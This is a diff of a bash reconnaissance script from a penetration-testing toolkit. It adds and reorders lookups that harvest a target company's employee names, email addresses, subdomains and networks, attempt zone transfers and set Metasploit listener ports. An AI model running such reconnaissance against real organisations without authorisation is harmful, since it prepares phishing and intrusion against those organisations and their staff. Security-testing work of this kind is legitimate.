@@ -1,5 +1,5 @@
 #!/bin/bash
-# test for lee to remove this comment with the git revert command
+#
 # by Lee Baird
 # Contact me via chat or email with any feedback or suggestions that you may have:
 # leebaird@gmail.com
@@ -41,18 +41,18 @@ if [[ `uname` == 'Darwin' ]]; then
      browser=Safari
      ip=$(ifconfig | grep -B3 'status: active' | grep 'broadcast' | cut -d ' ' -f2)
      interface=$(ifconfig | grep $ip -B3 | grep 'UP' | cut -d ':' -f1)
-	msf=/opt/metasploit-framework/bin/msfconsole
-	msfv=/opt/metasploit-framework/bin/msfvenom
-	port=4444
-	web="open -a Safari"
+     msf=/opt/metasploit-framework/bin/msfconsole
+     msfv=/opt/metasploit-framework/bin/msfvenom
+     port=4444
+     web="open -a Safari"
 else
      browser=Firefox
      ip=$(ip addr | grep 'global' | cut -d '/' -f1 | awk '{print $2}')
      interface=$(ip link | awk '{print $2, $9}' | grep 'UP' | cut -d ':' -f1)
-	msf=msfconsole
-	msfv=msfvenom
-	port=443
-	web="firefox -new-tab"
+     msf=msfconsole
+     msfv=msfvenom
+     port=443
+     web="firefox -new-tab"
 fi
 
 ##############################################################################################################
@@ -100,7 +100,7 @@ fi
 f_location(){
 echo
 echo -n "Enter the location of your file: "
-read location
+read -e location
 
 # Check for no answer
 if [[ -z $location ]]; then
@@ -143,7 +143,8 @@ mkdir $save_dir
 mv $name/ $save_dir 2>/dev/null
 
 # Recon files
-mv dnsdumpster-hosts emails* names networks records squatting whois* sub* doc pdf ppt txt xls tmp* z* $save_dir 2>/dev/null
+mv curl emails* names* networks* records squatting tracert whois* sub* doc pdf ppt txt xls tmp* z* $save_dir 2>/dev/null
+rm /tmp/emails /tmp/names /tmp/networks /tmp/profiles /tmp/subdomains 2>/dev/null
 
 echo "Saving complete"
 exit
@@ -165,6 +166,14 @@ read choice
 
 case $choice in
      1)
+     clear
+     f_banner
+
+     echo -e "\x1B[1;34mUses ARIN, dnsrecon, goofile, goog-mail, goohost, theHarvester, Metasploit, URLCrazy,\x1B[0m"
+     echo -e "\x1B[1;34mWhois, multiple websites, and recon-ng.\x1B[0m"
+     echo
+     echo -e "\x1B[1;34m[*] Acquire API keys for Bing, Builtwith, Fullcontact, GitHub, Google, Hashes, and\x1B[0m"
+     echo -e "\x1B[1;34mShodan for maximum results with recon-ng.\x1B[0m"
      echo
      echo $medium
      echo
@@ -199,7 +208,9 @@ case $choice in
      fi
 
      # Number of tests
-     total=32
+     total=36
+
+     companyurl=$( printf "%s\n" "$company" | sed 's/ /%20/g;s/\&/%26/g;s/\,/%2C/g' )
 
      echo
      echo $medium
@@ -233,9 +244,8 @@ case $choice in
      rm zurls.txt zhandles.txt 2>/dev/null
 
      echo "     Networks             (3/$total)"
-     orgurl=$( printf "%s\n" "$company" | sed 's/ /%20/g' )
 
-     wget -q https://whois.arin.net/rest/orgs\;name=$orgurl -O tmp.xml
+     wget -q https://whois.arin.net/rest/orgs\;name=$companyurl -O tmp.xml
 
      if [ -s tmp.xml ]; then
           xmllint --format tmp.xml | grep 'handle' | cut -d '/' -f6 | cut -d '<' -f1 | sort -uV > tmp
@@ -251,7 +261,7 @@ case $choice in
           done < tmp
      fi
 
-     $sip tmp3 > networks 2>/dev/null
+     $sip tmp3 > networks-tmp 2>/dev/null
      echo
 
      echo "dnsrecon                  (4/$total)"
@@ -335,12 +345,7 @@ case $choice in
      # Realign Columns
      sed -e 's/..,/   /g' tmp2 > tmp3
      # Convert Caps
-     sed 's/AUSTRALIA/Australia/g; s/AUSTRIA/Austria/g; s/BAHAMAS/Bahamas/g; s/BANGLADESH/Bangladesh/g; s/BELGIUM/Belgium/g; s/CANADA/Canada/g; s/CAYMAN ISLANDS/Cayman Islands/g;
-s/CHILE/Chile/g; s/CHINA/China/g; s/COSTA RICA/Costa Rica/g; s/CZECH REPUBLIC/Czech Republic/g; s/DENMARK/Denmark/g; s/EUROPEAN UNION/European Union/g; s/FINLAND/Finland/g;
-s/FRANCE/France/g; s/GERMANY/Germany/g; s/HONG KONG/Hong Kong/g; s/HUNGARY/Hungary/g; s/INDIA/India/g; s/IRELAND/Ireland/g; s/ISRAEL/Israel/g; s/ITALY/Italy/g; s/JAPAN/Japan/g;
-s/KOREA REPUBLIC OF/Republic of Korea/g; s/LUXEMBOURG/Luxembourg/g; s/NETHERLANDS/Netherlands/g; s/NORWAY/Norway/g; s/POLAND/Poland/g; s/RUSSIAN FEDERATION/Russia            /g;
-s/SAUDI ARABIA/Saudi Arabia/g; s/SPAIN/Spain/g; s/SWEDEN/Sweden/g; s/SWITZERLAND/Switzerland/g; s/TAIWAN REPUBLIC OF China (ROC)/Taiwan                        /g; s/THAILAND/Thailand/g; s/TURKEY/Turkey/g;
-s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United States/g; s/VIRGIN ISLANDS (BRITISH)/Virgin Islands          /g; s/ROMANIA/Romania/g; s/SLOVAKIA/Slovakia/g' tmp3 > squatting
+     sed 's/AUSTRALIA/Australia/g; s/AUSTRIA/Austria/g; s/BAHAMAS/Bahamas/g; s/BANGLADESH/Bangladesh/g; s/BELGIUM/Belgium/g; s/CANADA/Canada/g; s/CAYMAN ISLANDS/Cayman Islands/g; s/CHILE/Chile/g; s/CHINA/China/g; s/COSTA RICA/Costa Rica/g; s/CZECH REPUBLIC/Czech Republic/g; s/DENMARK/Denmark/g; s/EUROPEAN UNION/European Union/g; s/FINLAND/Finland/g; s/FRANCE/France/g; s/GERMANY/Germany/g; s/HONG KONG/Hong Kong/g; s/HUNGARY/Hungary/g; s/INDIA/India/g; s/IRELAND/Ireland/g; s/ISRAEL/Israel/g; s/ITALY/Italy/g; s/JAPAN/Japan/g; s/KOREA REPUBLIC OF/Republic of Korea/g; s/LUXEMBOURG/Luxembourg/g; s/NETHERLANDS/Netherlands/g; s/NORWAY/Norway/g; s/POLAND/Poland/g; s/RUSSIAN FEDERATION/Russia            /g; s/SAUDI ARABIA/Saudi Arabia/g; s/SPAIN/Spain/g; s/SWEDEN/Sweden/g; s/SWITZERLAND/Switzerland/g; s/TAIWAN REPUBLIC OF China (ROC)/Taiwan                        /g; s/THAILAND/Thailand/g; s/TURKEY/Turkey/g; s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United States/g; s/VIRGIN ISLANDS (BRITISH)/Virgin Islands          /g; s/ROMANIA/Romania/g; s/SLOVAKIA/Slovakia/g' tmp3 > squatting
 
      ##############################################################
 
@@ -358,14 +363,15 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      # Remove lines that contain a single word
      sed '/[[:blank:]]/!d' tmp6 > tmp7
      # Clean up
-     egrep -v '(abuse|academy|account|achievement|active|administrator|administrative|advanced|adventure|advertising|america|american|analysis|analyst|antivirus|apple seems|application|applications|architect|article|asian|assistant|associate|association|attorney|auditor|australia|automation|automotive|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|certified|challenger|championship|change|chapter|charge|china|chinese|clearance|cloud|code|college|columbia|communications|community|company pages|competition|competitive|compliance|computer|concept|conference|config|connections|connect|construction|consultant|contractor|contributor|controllang|cooperation|coordinator|corporation|creative|critical|croatia|crm|dallas|day care|death toll|delta|department|description|designer|design|detection|developer|develop|development|devine|digital|diploma|director|disability|disaster|disclosure|dispute|division|document|dos poc|download|drivers|during|economy|ecovillage|editor|education|effect|electronic|else|emails|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expertzone|exploit|facebook|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|filmmaker|finance|financial|forensic|found|freelance|from|frontiers in tax|full|function|fuzzing|germany|get control|global|google|government|graphic|greater|group|guardian|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|house|how to|hurricane|icmp|idc|in the news|index|informatics|information|innovation|installation|insurers|integrated|international|internet|instructor|insurance|intelligence|interested|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|laptops|leadership|letter|licensing|lighting|limitless|liveedu|llp|local|looking|ltd|lsu|luscous|malware|managed|management|manager|managing|manufacturing|marketplace|mastering|maturity|md|media|medical|medicine|member|meta tags|methane|metro|microsoft|middle east|mission|mitigation|money|monitor|more coming|mortgage|museums|negative|network|network|new user|newspaper|new york|next page|nitrogen|nyc|obtain|occupied|offers|office|online|operations|organizational|outbreak|owners|page|partner|pathology|peace|people|perceptions|philippines|photo|picture|places|planning|portfolio|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|publichealth|published|pyramid|questions|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|republic|research|resolving|revised|rising|rural health|sales|satellite|save the date|school|scheduling|science|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solutions|source|special|station home|statistics|strategy|student|successful|superheroines|supervisor|support|switch|system|systems|talent|targeted|tax|tcp|technical|technology|tester|textoverflow|theater|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|treasury|trojan|twitter|training|ts|tylenol|types of scams|unclaimed|underground|university|united states|untitled|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|wanted|web search|web site|website|welcome|west virginia|when the|whiskey|window|worker|world|www|xbox)' tmp7 > tmp8
+     egrep -v '(abuse|academy|account|achievement|active|administrator|administrative|advanced|adventure|advertising|america|american|analysis|analyst|antivirus|apple seems|application|applications|architect|article|asian|assistant|associate|association|attorney|auditor|australia|automation|automotive|balance|bank|bbc|beginning|berlin|beta theta|between|big game|billion|bioimages|biometrics|bizspark|breaches|broker|business|buyer|buying|california|cannot|capital|career|carrying|cashing|center|certified|challenger|championship|change|chapter|charge|china|chinese|clearance|cloud|code|college|columbia|communications|community|company pages|competition|competitive|compliance|computer|concept|conference|config|connections|connect|construction|consultant|contractor|contributor|controllang|cooperation|coordinator|corporation|creative|critical|croatia|crm|dallas|day care|death toll|delta|department|description|designer|design|detection|developer|develop|development|devine|digital|diploma|director|disability|disaster|disclosure|dispute|division|document|dos poc|download|drivers|during|economy|ecovillage|editor|education|effect|electronic|else|emails|embargo|emerging|empower|employment|end user|energy|engineer|enterprise|entertainment|entreprises|entrepreneur|entry|environmental|error page|ethical|example|excellence|executive|expertzone|exploit|facebook|faculty|failure|fall edition|fast track|fatherhood|fbi|federal|filmmaker|finance|financial|forensic|found|freelance|from|frontiers in tax|full|function|fuzzing|germany|get control|global|google|government|graphic|greater|group|guardian|hackers|hacking|harden|harder|hawaii|hazing|headquarters|health|help|history|homepage|hospital|hostmaster|house|how to|hurricane|icmp|idc|in the news|index|informatics|information|innovation|installation|insurers|integrated|international|internet|instructor|insurance|intelligence|interested|investigation|investment|investor|israel|items|japan|job|justice|kelowna|knowing|laptops|leadership|letter|licensing|lighting|limitless|liveedu|llp|local|looking|ltd|lsu|luscous|malware|managed|management|manager|managing|manufacturing|marketplace|mastering|maturity|md|media|medical|medicine|member|meta tags|methane|metro|microsoft|middle east|mission|mitigation|mn|money|monitor|more coming|mortgage|museums|negative|network|network|new user|newspaper|new york|next page|nitrogen|nyc|obtain|occupied|offers|office|online|operations|organizational|outbreak|owners|page|partner|pathology|peace|people|perceptions|philippines|photo|picture|places|planning|portfolio|potential|preassigned|preparatory|president|principal|print|private|process|producer|product|professional|professor|profile|project|program|publichealth|published|pyramid|questions|recruiter|redeem|redirect|region|register|registry|regulation|rehab|remote|report|republic|research|resolving|revised|rising|rural health|sales|satellite|save the date|school|scheduling|science|search|searc|sections|secured|security|secretary|secrets|see more|selection|senior|server|service|services|social|software|solutions|source|special|station home|statistics|strategy|student|successful|superheroines|supervisor|support|switch|system|systems|talent|targeted|tax|tcp|technical|technology|tester|textoverflow|theater|time in|tit for tat|title|toolbook|tools|toxic|traditions|trafficking|transfer|treasury|trojan|twitter|training|ts|tylenol|types of scams|unclaimed|underground|university|united states|untitled|verification|vietnam|view|Violent|virginia bar|voice|volkswagen|volume|wanted|web search|web site|website|welcome|west virginia|when the|whiskey|window|worker|world|www|xbox)' tmp7 > tmp8
      # Clean up
      sed 's/iii/III/g' tmp8 | sed 's/ii/II/g' > tmp9
      # Capitalize the first letter of every word
      sed 's/\b\(.\)/\u\1/g' tmp9 > tmp10
      grep -v ',' tmp10 | awk '{print $2", "$1}' > tmp11
      grep ',' tmp10 > tmp12
-     cat tmp11 tmp12 | sort -u > names
+     # Remove trailing whitespace from each line
+     cat tmp11 tmp12 | sed 's/[ \t]*$//' | sort -u > names-tmp
 
      ##############################################################
 
@@ -422,36 +428,48 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
           fi
      done < tmp13 > whois-domain
 
-     echo "     IP 		     (25/$total)"
-     y=$(dig $domain | grep "$domain" | grep -v ';' | awk '{print $5}')
-     whois -H $y > tmp
+     echo "     IP 		  (25/$total)"
+     wget -q tracert.com/resolver?arg=$domain -O tracert
+     mult=$(grep 'Resolution' tracert | sed -e 's/<[^>]*>//g' | sed 's/^ *//g' | cut -d ' ' -f9)
 
-     # Remove leading whitespace
-     sed 's/^[ \t]*//' tmp > tmp2
-     # Remove trailing whitespace from each line
-     sed 's/[ \t]*$//' tmp2 > tmp3
-     # Clean up
-     egrep -v '(\#|\%|\*|All reports|Comment|dynamic hosting|For fastest|For more|Found a referral|http|OriginAS:$|Parent:$|point in|RegDate:$|remarks:|The activity|the correct|this kind of object|Without these)' tmp3 > tmp4
-     # Remove leading whitespace from file
-     awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp4 > tmp5
-     # Remove blank lines from end of file
-     awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
-     # Compress blank lines
-     cat -s tmp6 > tmp7
-     # Clean up
-     sed 's/+1-//g' tmp7 > tmp8
-     while IFS=$': \t' read -r first rest; do
-          if [[ $first$rest ]]; then
-               printf '%-20s %s\n' "$first:" "$rest"
-          else
-               echo
-          fi
-     done < tmp8 > whois-ip
+     if [ "$mult" = "addresses:" ]; then
+          y=$(grep -A1 'Resolution' tracert | tail -n +2 | sed -e 's/<[^>]*>//g' | sed 's/^ *//g')
+     else
+          y=$(grep 'Resolution' tracert | sed 's/^ *//g' | tr '<' ' ' | cut -d ' ' -f6)
+     fi
+
+     if ! [ "$y" = "" ]; then
+          whois -H $y > tmp
+          # Remove leading whitespace
+          sed 's/^[ \t]*//' tmp > tmp2
+          # Remove trailing whitespace from each line
+          sed 's/[ \t]*$//' tmp2 > tmp3
+          # Clean up
+          egrep -v '(\#|\%|\*|All reports|Comment|dynamic hosting|For fastest|For more|Found a referral|http|OriginAS:$|Parent:$|point in|RegDate:$|remarks:|The activity|the correct|this kind of object|Without these)' tmp3 > tmp4
+          # Remove leading whitespace from file
+          awk '!d && NF {sub(/^[[:blank:]]*/,""); d=1} d' tmp4 > tmp5
+          # Remove blank lines from end of file
+          awk '/^[[:space:]]*$/{p++;next} {for(i=0;i<p;i++){printf "\n"}; p=0; print}' tmp5 > tmp6
+          # Compress blank lines
+          cat -s tmp6 > tmp7
+          # Clean up
+          sed 's/+1-//g' tmp7 > tmp8
+          while IFS=$': \t' read -r first rest; do
+               if [[ $first$rest ]]; then
+                    printf '%-20s %s\n' "$first:" "$rest"
+               else
+                    echo
+               fi
+          done < tmp8 > whois-ip
+          echo
+
+          # Remove all empty files
+          find -type f -empty -exec rm {} +
+     else
+          echo > whois-ip
+     fi
+
      echo
-
-     # Remove all empty files
-     find -type f -empty -exec rm {} +
-
      echo "dnsdumpster.com           (26/$total)"
      wget -q https://dnsdumpster.com/static/map/$domain.png -O $home/data/$domain/images/dnsdumpster.png
 
@@ -464,7 +482,7 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      wget -q $dumpsterxls -O tmp.xlsx
 
      ssconvert -E Gnumeric_Excel:xlsx -T Gnumeric_stf:stf_csv tmp.xlsx tmp.csv 2>/dev/null
-     cat tmp.csv | sed 's/,"//g' | egrep -v '(Hostname|MX|NS)' | cut -d ',' -f1-2 | grep -v '"' | sed 's/,/ /g' | sort -u | column -t > dnsdumpster-hosts
+     cat tmp.csv | sed 's/,"//g' | egrep -v '(Hostname|MX|NS)' | cut -d ',' -f1-2 | grep -v '"' | sed 's/,/ /g' | sort -u | column -t > sub-dnsdumpster
 
      echo "dnssy.com                 (27/$total)"
      wget -q --post-data 'q=$domain&step=1&r=1448215046#3cc723b32910c180bc45aba6c21be6edf4125745' http://www.dnssy.com/report.php -O tmp
@@ -483,12 +501,141 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      s/Your nameservers/Nameservers/g; s/Your NS records at your nameservers are://g; s/Your NS records at your parent nameserver are://g;
      s/Your SOA/SOA/g; s/Your web server/The web server/g; s/Your web server says it is://g' tmp3 > $home/data/$domain/data/config.htm
 
-     echo "email-format.com          (28/$total)"
+     echo "dnswatch.info             (28/$total)"
+     echo '*' > tmp
+     echo '%' >> tmp
+
+     # A record
+     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=A\&submit=Resolve -O tmp2
+     grep 'A record found' tmp2 | sed 's/">/ /g' | sed 's/<\// /g' | awk '{print $6","$1","" "}' >> tmp
+
+     # NS records
+     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=NS\&submit=Resolve -O tmp2
+     grep 'NS record found' tmp2 | sed 's/\.</>/g' | cut -d '>' -f2 > tmp3
+     while read i; do wget -q tracert.com/resolver?arg=$i -O tracert; grep 'Resolution' tracert | sed 's/^ *//g' | tr '<' ' ' | cut -d ' ' -f6 | awk '{print $1",""NS"","host}' host="$i" >> tmp; done < tmp3
+
+     # MX Records
+     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=MX\&submit=Resolve -O tmp2
+     grep 'MX record found' tmp2 | sed 's/\.</ /g' | cut -d ' ' -f6 > tmp3
+     while read i; do
+          wget -q tracert.com/resolver?arg=$i -O tracert
+          mult=$(grep 'Resolution' tracert | sed -e 's/<[^>]*>//g' | sed 's/^ *//g' | cut -d ' ' -f9)
+          if [ "$mult" = "addresses:" ]; then
+               sed '1,/Resolution/d;/does not have/,$d' tracert | sed -e 's/<[^>]*>//g' | sed 's/^ *//g' | sed '/^$/d' > tmp4
+               while read a; do echo $a | awk '{print $a",""MX"","host}' host="$i" >> tmp; done < tmp4
+          else
+               grep 'Resolution' tracert | sed 's/^ *//g' | tr '<' ' ' | cut -d ' ' -f6 | awk '{print $1",""MX"","host}' host="$i" >> tmp
+          fi
+     done < tmp3
+
+     # SOA records
+     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=SOA\&submit=Resolve -O tmp2
+     grep 'SOA record found' tmp2 | sed 's/>/ /g' | sed 's/\. / /g' | cut -d ' ' -f6 > tmp3
+     grep 'SOA record found' tmp2 | sed 's/>/ /g' | sed 's/\. / /g' | cut -d ' ' -f7 >> tmp3
+     while read i; do wget -q tracert.com/resolver?arg=$i -O tracert; grep 'Resolution' tracert | sed 's/^ *//g' | tr '<' ' ' | cut -d ' ' -f6 | awk '{print $1",""SOA"","host}' host="$i" >> tmp; done < tmp3
+
+     # TXT records
+     wget -q https://www.dnswatch.info/dns/dnslookup?la=en\&host=$domain\&type=TXT\&submit=Resolve -O tmp2
+     grep 'TXT record found' tmp2 | sed 's/>&quot;/%/g' | sed 's/&quot;</%/g' | sed 's/TXT/%TXT%/g' | awk -F'%' '{print " "","$2","$4}' >> tmp
+
+     # Formatting & clean-up
+     column -s ',' -t tmp > tmp4
+
+     sed "s/*/ /g" tmp4 | sed 's/%/ /g' >> $home/data/$domain/data/records.htm
+     echo >> $home/data/$domain/data/records.htm
+     echo '</body>' >> $home/data/$domain/data/records.htm
+     echo >> $home/data/$domain/data/records.htm
+     echo '</html>' >> $home/data/$domain/data/records.htm
+
+     echo "email-format.com          (29/$total)"
      curl --silent http://www.email-format.com/d/$domain/ | grep -o [A-Za-z0-9_.]*@[A-Za-z0-9_.]*[.][A-Za-z]* > zemail-format
+
+     echo "ewhois.com                (30/$total)"
+     wget -q http://www.ewhois.com/$domain/ -O tmp
+     cat tmp | grep 'visitors' | cut -d '(' -f1 | cut -d '>' -f2 | grep -v 'OTHER' | column -t | sort -u > sub3
+
+     echo "intodns.com               (31/$total)"
+     wget -q http://www.intodns.com/$domain -O tmp
+     cat tmp | sed '1,32d' | sed 's/<table width="99%" cellspacing="1" class="tabular">/<center><table width="85%" cellspacing="1" class="tabular"><\/center>/g' | sed 's/Test name/Test/g' | sed 's/ <a href="feedback\/?KeepThis=true&amp;TB_iframe=true&amp;height=300&amp;width=240" title="intoDNS feedback" class="thickbox feedback">send feedback<\/a>//g' | egrep -v '(Processed in|UA-2900375-1|urchinTracker|script|Work in progress)' | sed '/footer/I,+3 d' | sed '/google-analytics/I,+5 d' > tmp2
+     cat tmp2 >> $home/data/$domain/pages/config.htm
+
+     echo "myipneighbors.net         (32/$total)"
+     wget -q http://www.myipneighbors.net/?s=$domain -O tmp
+     grep 'Domains' tmp | sed 's/<\/tr>/\\\n/g' | cut -d '=' -f3,6 | sed 's/" rel=/ /g' | sed 's/" rel//g' | grep -v '/' | column -t | sort -u > sub4
+
+     echo "netcraft.com              (33/$total)"
+     wget -q http://toolbar.netcraft.com/site_report?url=http://$domain -O tmp
+
+     # Remove lines from FOO to the second BAR
+     awk '/DOCTYPE/{f=1} (!f || f>2){print} (f && /\/form/){f++}' tmp > tmp2
+
+     egrep -v '(Background|Hosting country|the-world-factbook)' tmp2 | sed 's/Refresh//g' > tmp3
+
+     # Find lines that contain FOO, and delete to the end of file
+     sed '/security_table/,${D}' tmp3 > tmp4
+
+     # Compress blank lines
+     sed /^$/d tmp4 >> $home/data/$domain/pages/netcraft.htm
+     echo >> $home/data/$domain/pages/netcraft.htm
+     echo >> $home/data/$domain/pages/netcraft.htm
+     echo '</body>' >> $home/data/$domain/pages/netcraft.htm
+     echo >> $home/data/$domain/pages/netcraft.htm
+     echo '</html>' >> $home/data/$domain/pages/netcraft.htm
+
+     echo "ultratools.com            (34/$total)"
+     x=0
+
+     f_passive_axfr(){
+          sed -e 's/<[^>]*>//g' curl > tmp
+          grep -A4 "\<.*$domain\>" tmp | sed 's/--//g' | sed 's/\.$//g' | sed 's/^ *//g' | sed '/^$/d' > tmp2
+          cat tmp2 | paste - - - - - -d, | column -s ',' -t > tmp3
+          sort -u tmp3 >> $home/data/$domain/data/zonetransfer.htm
+          echo >> $home/data/$domain/data/zonetransfer.htm
+     }
+
+     while [ $x -le 10 ]; do
+          curl -k --silent https://www.ultratools.com/tools/zoneFileDumpResult?zoneName=$domain > curl
+          q=$(grep "$domain" curl | wc -l)
+          if [ $q -gt 1 ]; then
+               f_passive_axfr
+               break
+          else
+               x=$(( $x + 1 ))
+               sleep 2
+          fi
+     done
+
+     if [ $x -eq 11 ]; then
+          echo 'Zone transfer not allowed.' >> $home/data/$domain/data/zonetransfer.htm
+     fi
+
+     echo '</body>' >> $home/data/$domain/data/zonetransfer.htm
+     echo >> $home/data/$domain/data/zonetransfer.htm
+     echo '</html>' >> $home/data/$domain/data/zonetransfer.htm
+
+     echo "urlvoid.com               (35/$total)"
+     wget -q http://www.urlvoid.com/scan/$domain -O tmp
+     sed -n '/Safety Scan Report/,/<\/table>/p' tmp | grep -v 'Safety Scan Report' | sed 's/View more details.../Details/g' > $home/data/$domain/data/black-listed.htm
+     echo
+
+     echo "recon-ng                  (36/$total)"
+     cp $discover/resource/recon-ng.rc $discover/
+     sed -i "s/xxx/$companyurl/g" $discover/recon-ng.rc
+     sed -i 's/%26/\&/g;s/%20/ /g;s/%2C/\,/g' $discover/recon-ng.rc
+     sed -i "s/yyy/$domain/g" $discover/recon-ng.rc
+     recon-ng --no-check -r $discover/recon-ng.rc
+
+     grep "@$domain" /tmp/emails | awk '{print $2}' | egrep -v '(>|SELECT)' > emails-recon
+     grep '/' /tmp/networks | grep -v 'Spooling' | awk '{print $2}' | $sip > networks-recon
+     grep "$domain" /tmp/subdomains | grep -v '>' | awk '{print $2,$4}' | column -t > sub-recon
+
+     grep '|' /tmp/names | awk '{print $2", "$4}' | egrep -v '(_|\|)' | tr '[A-Z]' '[a-z]' | sed 's/\b\(.\)/\u\1/g' > tmp
+     grep '|' /tmp/profiles | awk '{print $3", "$2}' | grep -v '|' > tmp2
+     cat tmp tmp2 | grep -iv 'INFORM' | sort -u > names-recon
 
      ##############################################################
 
-     cat z* | grep "@$domain" | grep -vF '...' | grep -Fv '..' | egrep -v '(%|\*|=|\+|\[|\]|\||;|:|"|<|>|/|\?|definetlynot|edward_snoden|fake|fuckthepolice|salessalesandmarketing|www|xxxxx|yousuck)' > tmp
+     cat z* | grep "@$domain" | grep -vF '...' | grep -Fv '..' | egrep -v '(%|\*|-|=|\+|\[|\]|\||;|:|"|<|>|/|\?|definetlynot|edward_snowden|fake|fuckthepolice|lastname_firstname|regulations.gov|salessalesandmarketing|toastmasters|www|xxxxx|yousuck|zxcvbcvxvxcccb)' > tmp
      # Remove trailing whitespace from each line
      sed 's/[ \t]*$//' tmp > tmp2
      # Remove lines that start with a number
@@ -500,30 +647,17 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      # Remove lines that start with _
      sed '/^\_/ d' tmp5 > tmp6
      # Change to lower case
-     cat tmp6 | tr '[A-Z]' '[a-z]' | sort -u > emails
+     cat tmp6 emails-recon | tr '[A-Z]' '[a-z]' | sort -u > emails
 
      ##############################################################
 
-     echo "ewhois.com                (29/$total)"
-     wget -q http://www.ewhois.com/$domain/ -O tmp
-     cat tmp | grep 'visitors' | cut -d '(' -f1 | cut -d '>' -f2 | grep -v 'OTHER' | column -t | sort -u > sub3
+     cat names-tmp names-recon | sort -u > names
 
-     echo "intodns.com               (30/$total)"
-     wget -q http://www.intodns.com/$domain -O tmp
-     cat tmp | sed '1,32d' | sed 's/<table width="99%" cellspacing="1" class="tabular">/<center><table width="85%" cellspacing="1" class="tabular"><\/center>/g' | sed 's/Test name/Test/g' | sed 's/ <a href="feedback\/?KeepThis=true&amp;TB_iframe=true&amp;height=300&amp;width=240" title="intoDNS feedback" class="thickbox feedback">send feedback<\/a>//g' | egrep -v '(Processed in|UA-2900375-1|urchinTracker|script|Work in progress)' | sed '/footer/I,+3 d' | sed '/google-analytics/I,+5 d' > tmp2
-     cat tmp2 >> $home/data/$domain/pages/config.htm
+     cat networks-tmp networks-recon | sort -u | $sip > networks
 
-     echo "myipneighbors.net         (31/$total)"
-     wget -q http://www.myipneighbors.net/?s=$domain -O tmp
-     grep 'Domains' tmp | sed 's/<\/tr>/\\\n/g' | cut -d '=' -f3,6 | sed 's/" rel=/ /g' | sed 's/" rel//g' | grep -v '/' | column -t | sort -u > sub4
-
-     cat sub* | grep -v "$domain\." | sed 's/www\.//g' | column -t | sort -u > tmp
+     cat sub* | grep -v "$domain\." | sed 's/www\.//g' | column -t | tr '[A-Z]' '[a-z]' | sort -u > tmp
      # Remove lines that contain a single word
      sed '/[[:blank:]]/!d' tmp > subdomains
-
-     echo "urlvoid.com               (32/$total)"
-     wget -q http://www.urlvoid.com/scan/$domain -O tmp
-     sed -n '/Safety Scan Report/,/<\/table>/p' tmp | grep -v 'Safety Scan Report' | sed 's/View more details.../Details/g' > $home/data/$domain/data/black-listed.htm
 
      awk '{print $2}' subdomains > tmp
      grep -E '([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})\.([0-9]{1,3})' tmp | egrep -v '(-|=|:)' | $sip > hosts
@@ -599,7 +733,6 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
           cat subdomains >> tmp
           echo >> tmp
           cat subdomains >> $home/data/$domain/data/subdomains.htm
-          cat dnsdumpster-hosts >> $home/data/$domain/data/subdomains.htm
      fi
 
      if [ -e xls ]; then
@@ -675,10 +808,11 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
 
      cat zreport >> $home/data/$domain/data/passive-recon.htm; echo "</pre>" >> $home/data/$domain/data/passive-recon.htm
 
-     rm debug* dnsdumpster-hosts emails hosts names networks squatting sub* tmp* whois* z* doc pdf ppt txt xls 2>/dev/null
+     mv recon-ng.rc $home/data/$domain/ 2>/dev/null
+     rm curl debug* emails* hosts names* networks* squatting sub* tmp* tracert whois* z* doc pdf ppt txt xls 2>/dev/null
+     rm /tmp/emails /tmp/names /tmp/networks /tmp/profiles /tmp/subdomains 2>/dev/null
 
-     # Screenshots for Netcraft and Robtex
-     cutycapt --url="toolbar.netcraft.com/site_report?url=http://www.$domain" --out=$home/data/$domain/images/netcraft.png 2>/dev/null
+     # Screenshot for Robtex
      wget -q https://www.robtex.com/gfx/graph.png?dns=$domain -O $home/data/$domain/images/robtex.png
 
      echo
@@ -696,9 +830,11 @@ s/UKRAINE/Ukraine/g; s/UNITED KINGDOM/United Kingdom/g; s/UNITED STATES/United S
      f_runlocally
 
      $web &
-     sleep 3
-     $web toolbar.netcraft.com/site_report?url=http://www.$domain &
-     sleep 3
+     sleep 4
+     $web https://connect.data.com/login &
+     sleep 2
+     $web https://www.google.com/search?site=\&tbm=isch\&source=hp\&q=$companyurl%2Blogo &
+     sleep 2
      $web https://www.google.com/#q=filetype%3Axls+OR+filetype%3Axlsx+site%3A$domain &
      sleep 2
